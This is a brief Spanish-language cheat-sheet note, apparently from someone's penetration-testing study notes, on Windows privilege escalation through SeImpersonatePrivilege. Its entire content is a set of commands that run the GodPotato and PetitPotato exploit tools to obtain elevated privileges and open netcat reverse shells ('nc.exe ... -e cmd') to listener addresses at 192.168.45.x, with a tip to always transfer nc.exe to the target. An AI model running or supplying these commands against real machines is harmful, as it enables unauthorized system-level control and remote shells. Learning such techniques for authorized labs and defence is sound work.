---
tags: [privesc, windows, seimpersonate]
---

# SeImpersonatePrivilege

Dependiendo de la máquina funciona una u otra herramienta. Intentar transferir `nc.exe` siempre.

```bash
.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.161 4442 -e cmd"

.\PetitPotato.exe 3 "nc.exe 192.168.45.221 4444 -e cmd"
.\PetitPotato.exe 3 powershell
```

